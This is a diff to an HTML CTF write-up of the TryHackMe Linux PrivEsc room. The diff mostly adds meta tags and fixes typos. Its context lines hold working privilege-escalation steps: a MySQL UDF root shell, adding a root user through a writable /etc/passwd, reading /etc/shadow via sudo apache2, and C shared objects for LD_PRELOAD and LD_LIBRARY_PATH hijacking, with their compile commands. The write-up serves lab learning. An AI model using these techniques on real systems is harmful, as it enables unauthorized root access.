@@ -3,11 +3,31 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CTF Write-up: Linux PrivEsc</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="description" content="TryHackMe Linux PrivEsc write-up — MySQL UDF, /etc/shadow and /etc/passwd weaknesses, sudo shell escapes, LD_PRELOAD and LD_LIBRARY_PATH abuse.">
+    <meta name="author" content="Andrew Hardiman">
+    <title>Andrew Hardiman — CTF Write-up: Linux PrivEsc</title>
+    <!-- Security-related meta tags -->
+    <meta http-equiv="Content-Security-Policy" content="default-src 'self'; style-src 'self' 'unsafe-inline'; script-src 'self'; img-src 'self' data:;">
+    <meta name="referrer" content="no-referrer">
+    <meta name="robots" content="index, follow">
+    <!-- Link to external stylesheet -->
     <link rel="stylesheet" href="/css/styles.css">
-
     <!-- Favicon -->
     <link rel="icon" href="/img/logo.png" type="image/png">
+    <!-- Open Graph for better sharing on social media -->
+    <meta property="og:title" content="Andrew Hardiman — CTF Write-up: Linux PrivEsc">
+    <meta property="og:description" content="TryHackMe Linux PrivEsc write-up — MySQL UDF, /etc/shadow and /etc/passwd weaknesses, sudo shell escapes, LD_PRELOAD and LD_LIBRARY_PATH abuse.">
+    <meta property="og:image" content="https://andrew-hardiman.github.io/img/logo.png">
+    <meta property="og:url" content="https://andrew-hardiman.github.io/writeups/thm_linux_privesc.html">
+    <meta property="og:type" content="article">
+    <!-- Twitter Card for better sharing on Twitter -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="Andrew Hardiman — CTF Write-up: Linux PrivEsc">
+    <meta name="twitter:description" content="TryHackMe Linux PrivEsc write-up — MySQL UDF, /etc/shadow and /etc/passwd weaknesses, sudo shell escapes, LD_PRELOAD and LD_LIBRARY_PATH abuse.">
+    <meta name="twitter:image" content="https://andrew-hardiman.github.io/img/logo.png">
+    <!-- Links to JavaScript Files -->
+    <script src="/js/main.js" defer></script>
 </head>
 <body>
     <header>
@@ -19,11 +39,10 @@
                 <li class="dropdown">
                     <a href="#">CTF Write-ups</a>
                     <ul class="dropdown-content">
-                        <li><a href="hackthebox.html">Hack the Box</a></li>
+                        <!-- <li><a href="hackthebox.html">Hack the Box</a></li> -->
                         <li><a href="/writeups/tryhackme.html">Try Hack Me</a></li>
                     </ul>
                 </li>
-                <li><a href="#contact">Contact</a></li>
             </ul>
         </nav>
     </header>
@@ -83,7 +102,7 @@ mysql> </code></pre>
 	                <p>Create a new table "foo" with a single column, let's a call it "line", of type "BLOB":</p>
 	                <pre><code>mysql> create table foo(line blob);
 Query OK, 0 rows affected (0.01 sec)</code></pre>
-	                <p>Load the shared object file we created eariler in to the table, "foo":</p>
+	                <p>Load the shared object file we created earlier in to the table, "foo":</p>
 	                <pre><code>mysql> insert into foo values(load_file('/tmp/exploit_udf.so'));
 Query OK, 1 row affected (0.00 sec)</code></pre>
 	                <p>Dump the contents of the "foo" table into a file, effectively placing the UDF shared object file in a directory where MySQL expects to find plugin libraries:</p>
@@ -100,7 +119,7 @@ Query OK, 0 rows affected (0.00 sec)</code></pre>
 |                                                                   0 |
 +---------------------------------------------------------------------+
 1 row in set (0.00 sec)</code></pre>
-	                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the eariler steps of our attack).</p>
+	                <p>Exit the MySQL client and run the root shell ("-p" is important here as it tells BASH not to reset the environment variables to default, which would typically strip out any special environment variables or manipulations that may have been set during the earlier steps of our attack).</p>
 	                <pre><code>user@debian:/tmp$ /tmp/rootbash -p
 rootbash-4.1# whoami
 root</code></pre>
@@ -149,7 +168,7 @@ root</code></pre>
             <section id="Four">
                 <div class="section-header">Writeable /etc/passwd</div>
 	        <div class="section-content">
-	                <p>Again, a very similar techinque to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
+	                <p>Again, a very similar technique to the last two. In this case, we discover that we can write to the file "/etc/passwd".</p>
 	                <pre><code>user@debian:~$ ls -l /etc/passwd
 -rw-r--rw- 1 root root 1009 Aug 25 2019 /etc/passwd</code></pre>
 	                <p>This is pretty straight forward, we can simply replace the "x" password placeholder with a hash of our own for the root user. Or, we could add our own root user with a different user name. The latter is likely the better option as it is slightly more stealthy, as it does not disrupt the functionality of the existing root user. Generate a new password hash with password of your choice:</p>
@@ -190,13 +209,13 @@ User user may run the following commands on this host:
 	                <pre><code>sh-4.1# whoami
 root</code></pre>
 	                <p><strong>Congratulations, you own the system!</strong></p>
-	                <p>There is an "extra credit" with this particular part of the challenge. We saw eariler that our low-privileged user could run "/usr/sbin/apache2" as root, without requiring a password. However, if you look in the <strong>GTFOBins</strong> list, you will see that this program is not listed. Therefore, the techinque already discussed, running the program as root and using that program to execute a root shell will not work here. If "/usr/sbin/apache2" was the only program listed we would need to take a different approach. Luckily we have one!</p>
+	                <p>There is an "extra credit" with this particular part of the challenge. We saw earlier that our low-privileged user could run "/usr/sbin/apache2" as root, without requiring a password. However, if you look in the <strong>GTFOBins</strong> list, you will see that this program is not listed. Therefore, the technique already discussed, running the program as root and using that program to execute a root shell will not work here. If "/usr/sbin/apache2" was the only program listed we would need to take a different approach. Luckily we have one!</p>
 	                <p><strong>Reading the root user hash with Apache2</strong></p>
 	                <p>Let's assume an example scenario where we have gained a foothold into a system and we need to escalate our privileges to root. Let us further assume that both the "/etc/shadow" and "/etc/passwd" files are correctly configured and we cannot, therefore, read the password hash of root. Well, if we run "sudo -l" we see the following:</p>
 	                <pre><code>user@debian:~$ sudo -l
 User user may run the following commands on this host:
     (root) NOPASSWD: /usr/sbin/apache2</code></pre>
-	                <p>Therefore, we can use <strong>Apache2</strong> in order to "dump" the password hash of the root user. By executing Apache2 and passing it the "/etc/shadow" file as a configuration file, Apache will try to parse it as a valid Apache configuration file. At this point Apache will likely fail to start, as "/etc/shadow" is not a valid Apache configuration file and it is not in Apache's expected configuration format. This would not normally pose a security issue, as "/etc/shadow" is configured to only be readble by the root user. However, being as though we can run Apache as the root user, using sudo, Apache will, in turn, attempt to read the "/etc/shadow" file as root. When Apache fails to parse "/etc/shadow" it will likely reveal some content from the file in its error message. Let's try it and see:</p>
+	                <p>Therefore, we can use <strong>Apache2</strong> in order to "dump" the password hash of the root user. By executing Apache2 and passing it the "/etc/shadow" file as a configuration file, Apache will try to parse it as a valid Apache configuration file. At this point Apache will likely fail to start, as "/etc/shadow" is not a valid Apache configuration file and it is not in Apache's expected configuration format. This would not normally pose a security issue, as "/etc/shadow" is configured to only be readable by the root user. However, being as though we can run Apache as the root user, using sudo, Apache will, in turn, attempt to read the "/etc/shadow" file as root. When Apache fails to parse "/etc/shadow" it will likely reveal some content from the file in its error message. Let's try it and see:</p>
 	                <pre><code>user@debian:~$ sudo /usr/sbin/apache2 -f /etc/shadow 
 Syntax error on line 1 of /etc/shadow:
 Invalid command 'root:$6$Tb/euwmK$................'</code></pre>
@@ -224,7 +243,7 @@ User user may run the following commands on this host:
     (root) NOPASSWD: /usr/bin/find
 .... {truncated}</code></pre>
 	                <p>We will ignore the commands section for now, as this was discussed in detail in the last section of this write up, "Shell Escape Sequences". There is an interesting section at the top of the terminal output, "Matching Defaults entries for user on this host". This section of the "sudo -l" output specifies the <strong>default sudo settings</strong> that apply to the user when they execute commands with "sudo". The first setting "env_reset" means that when the user runs a command using "sudo", most of their environment variables will be cleared (reset). This is good, as it prevents malicious or unintended environment variables from affecting privileged commands. There is more however. The "env_keep" directive can be used to explicitly retain certain variables, and exclude them from those variables effected by the "env_reset" directive. Here there are two environment variables that have been explicity <strong>kept</strong>.</p>
-	                <p>The first is the "LD_PRELOAD" environment variable, which is used in Linux to specify shared libraries that should be loaded <strong>before</strong> any other standard system libraries. This means that when the user runs a command as "sudo", the libraries sepcified in "LD_PRELOAD" will still be preloaded. Secondly, the "LD_LIBRARY_PATH" environment variable is also retained. "LD_LIBRARY_PATH" is an environment variable that tells the dynamic linker where to look for shared libraries <strong>before</strong> searching in the system's default library paths.</p>
+	                <p>The first is the "LD_PRELOAD" environment variable, which is used in Linux to specify shared libraries that should be loaded <strong>before</strong> any other standard system libraries. This means that when the user runs a command as "sudo", the libraries specified in "LD_PRELOAD" will still be preloaded. Secondly, the "LD_LIBRARY_PATH" environment variable is also retained. "LD_LIBRARY_PATH" is an environment variable that tells the dynamic linker where to look for shared libraries <strong>before</strong> searching in the system's default library paths.</p>
 	                <p>Why is this an issue? Well, both the "LD_PRELOAD" and the "LD_LIBRARY_PATH" environment variables will both be inherited from the current user's environment, whenever the user executes a privileged command with "sudo". Therefore, we can simply create a malicious shared object file, run one of the programs that we are allowed to run via "sudo" (listed when running "sudo -l"), whilst setting the "LD_PRELOAD" environment variable to point to the full path of our malicious shared object.</p>
 	                <p>First, let's write a privilege escalation exploit in C.</p>
 	                <pre><code>#include &lt;unistd.h&gt;
@@ -237,10 +256,10 @@ void _init() {
 }</code></pre>
 	                <p>The code here is straightforward. First, we include two header files: "&lt;unistd.h&gt;", which is required for "setresuid()", and "&lt;stdlib.h&gt;", which provides functions like "system()" and "unsetenv()". We then define our function, "_init()". The "void" keyword tells the compiler that the function will not return any value.</p> 
 	                    <p>We use "_init()" instead of "main()" because "main()" is only executed when running a standalone C program (compiled as an executable). However, since we want our exploit to be loaded dynamically via "LD_PRELOAD", "_init()" is the better choice. This is because "_init()" executes automatically before the target program's "main()" function when the shared library is preloaded, allowing us to escalate privileges before any other code runs.</p>
-	                <p>Now, let's break down the body the "_init()" function. The first line removes the "LD_RRELOAD" environment variable using "unsetenv()". This covers our tracks, as we will be setting this variable to point to our malicious program. Next we set the real, effective, and saved user IDs to 0, which is the root user. This effectively grants us full root privileges for the remainder of our exploit. Finally, we use the "system()" command to spawn a root shell, ensuring that our elevated access persists.</p>
-	                <p>Now we simply complie our malcious C code, creating a shared object file. We will save this file in the "/tmp" directory, so that it clears on reboot.</p>
+	                <p>Now, let's break down the body the "_init()" function. The first line removes the "LD_PRELOAD" environment variable using "unsetenv()". This covers our tracks, as we will be setting this variable to point to our malicious program. Next we set the real, effective, and saved user IDs to 0, which is the root user. This effectively grants us full root privileges for the remainder of our exploit. Finally, we use the "system()" command to spawn a root shell, ensuring that our elevated access persists.</p>
+	                <p>Now we simply compile our malicious C code, creating a shared object file. We will save this file in the "/tmp" directory, so that it clears on reboot.</p>
 	                <pre><code>user@debian:~$ gcc -fPIC -shared -nostartfiles -o /tmp/naughty.so /home/user/naughty.c</code></pre>
-	                 <p>We can now simply run any of the programs that our user is allowed to run with "sudo", setting the "LD_REPLOAD" variable to point to our malicious shared object file in the process, and we will spawn a root shell.</p>
+	                 <p>We can now simply run any of the programs that our user is allowed to run with "sudo", setting the "LD_PRELOAD" variable to point to our malicious shared object file in the process, and we will spawn a root shell.</p>
 	                <pre><code>user@debian:~$ sudo LD_PRELOAD=/tmp/naughty.so nano
 root@debian:/home/usr#</code></pre>
 	                <p><strong>Congratulations, you own the system!</strong></p>
@@ -282,7 +301,7 @@ void hijack() {
 	system("/bin/bash -p");
 }</code></pre>
 	                <p>Here we are declaring a function called "hijack()". The "__attribute__((constructor))" ensures this function runs automatically when the shared library is loaded. We then remove the "LD_LIBRARY_PATH" from the environment to avoid detection or interference with further library loading. "setresuid(0,0,0);" sets the real, effective, and saved user IDs to 0 (root), giving us root privileges. Finally, "system('/bin/bash -p');" spawns a root shell.</p>
-	                <p>Complie and link the malicious C code to a shared object file, to a directory we control, here we use "/tmp":</p>
+	                <p>Compile and link the malicious C code to a shared object file, to a directory we control, here we use "/tmp":</p>
 	                <pre><code>user@debian:~$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/library_path.c</code></pre>
 	                <p>Finally, run "apache2" using "sudo", pointing the "LD_LIBRARY_PATH" to the directory containing our malicious version of the file named "libcrypt.so.1":</p>
 	                <pre><code>user@debian:~$ sudo LD_LIBRARY_PATH=/tmp apache2
@@ -295,7 +314,7 @@ root@debian:/home/user#</code></pre>
     </main>
 
     <footer>
-        <p>&copy; 2024 Andrew Hardiman. All rights reserved.</p>
+        <p>&copy; <span id="year">2026</span> Andrew Hardiman. All rights reserved.</p>
     </footer>
 <script src="/js/section_fold.js"></script>
 </body>
